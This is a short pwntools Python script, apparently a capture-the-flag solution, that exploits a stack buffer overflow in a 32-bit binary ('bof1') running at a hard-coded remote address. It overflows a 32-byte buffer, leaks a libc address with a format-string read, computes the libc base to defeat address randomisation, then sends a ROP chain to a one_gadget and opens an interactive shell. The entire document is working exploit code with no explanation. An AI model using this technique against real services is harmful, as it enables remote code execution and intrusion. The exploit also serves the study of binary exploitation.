# ROPgadget + one_gadget

from pwn import *

r = remote("34.94.172.42", 2021)
# r = process("./bof1")
# gdb.attach(r)

print(r.recv())

payload = "a"*32 + p32(0x80483c0) + p32(0x080485b1) + p32(0x0804ab00)
r.sendline(payload)
r.sendline("%10$p")

# payload1 = "a"*32 + p32(0x80483c0) + p32(0x080485b1) + p32(0x0804aa00)
# r.sendline(payload1)
# r.sendline("/bin/sh\x00")

payload1 = "a"*32 + p32(0x80483b0) + p32(0x080485b1) + p32(0x0804ab00)
r.sendline(payload1)
r.recv()
str_addr = r.recv()[59:69]
# str_addr = r.recv()[106:116]

print(str_addr)
rand_libcaddr = int(str_addr, 16)

rand_offset = 241 + 0x00018550 + 6 # __libc_start_main+241 on local, +247 on remote
# rand_offset = 102177

libc_base = rand_libcaddr - rand_offset
print(hex(libc_base))

got_base = 0x0804a000
rop_offset = 0x00017828
# rop_offset = 0x00018787
one_gadget_offset = 0x3a81c
# one_gadget_offset = 0x3ccea
# payload2 = p32(0x0804a000) + "a"*28 + p32(libc_base + rop_offset) + p32(libc_base + one_gadget_offset) + "a"*36 + "\x00\x00\x00\x00"
payload2 = "a"*32 + p32(libc_base + rop_offset) + p32(got_base) + p32(libc_base + one_gadget_offset) + 0x28*"\x00"
r.sendline(payload2)

r.interactive()